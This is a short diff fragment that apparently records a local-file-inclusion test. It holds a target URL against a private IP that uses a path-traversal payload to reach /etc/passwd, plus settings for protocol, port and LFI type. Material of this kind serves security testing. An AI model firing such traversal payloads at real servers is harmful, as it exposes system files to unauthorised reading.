@@ -1,0 +1,8 @@
+Target: http://192.168.1.100/var/www/html/cgi-bin/../../../etc/passwd
+
+Configuration:
+  Protocol: http
+  Port: 80
+  Target: 192.168.1.100
+  LFI Type: path
+  Base Path: var/www/html/cgi-bin
